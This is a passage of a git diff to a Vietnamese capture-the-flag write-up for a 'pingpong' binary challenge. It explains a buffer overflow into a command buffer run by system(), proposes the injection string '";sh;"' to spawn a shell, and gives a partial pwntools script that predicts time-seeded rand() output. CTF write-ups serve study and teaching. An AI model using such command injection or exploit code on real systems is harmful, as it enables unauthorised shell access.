@@ -16,4 +16,29 @@ Lỗ hổng *buffer overflow* cho phép ghi đè 64 BYTES vào buffer 32 BYTES. 
 <img width="482" height="185" alt="image" src="https://github.com/user-attachments/assets/78f0c257-cb62-4e46-865d-d13eeac01e47" />
 
 Chương trình sẽ đưa chuỗi `echo \"%s\" > /tmp/pingpong_scoreboard` vào biến cmd. Và trong chương trình cũng có hàm `printff` để gọi system thực thi chuỗi trong cmd.
-Lúc này nếu 
+Tuy nhiên, nếu chỉ đưa `/bin/sh` vào thì echo chỉ in ra nội dung y chang. 
+
+Thay vào đó dùng chuỗi `";sh;"`. Chuỗi này sẽ ngắt echo và tạo shell với kích thước dưới 7 BYTES. Nhưng với điều kiện là trong `envp` của chuỗi có đường dẫn `/bin` hay `/usr/bin`.
+
+## Bypass rand()
+Đầu tiên để tái tạo lại kết quả của `rand()` thì cần tạo biết seed ban đầu là gì. Chương trình dùng `time(0)` tức lấy thời gian hiện tại làm seed. Nếu như script dùng `time(0)` cùng lúc với chương trình thì sẽ tái tạo được seed. 
+
+    #!/usr/bin/env python3
+    from pwn import *
+    from ctypes import CDLL
+    libc =CDLL("libc.so.6")
+    context.binary=exe=ELF('./pingpong_patched',checksec=False)
+    while(1):            //brute force thì có thể lệch thời gian với server
+    	p=process(exe.path)
+    
+    	p.recvuntil('my game?')
+    	seed=libc.time(0)
+    	libc.srand(seed)
+    
+    	for i in range(20):
+    		payload=libc.rand()%2
+    		if payload==0:
+    			p.sendlineafter(b'right',b'l')
+    		else:
+    			p.sendlineafter(b'right',b'r')
+
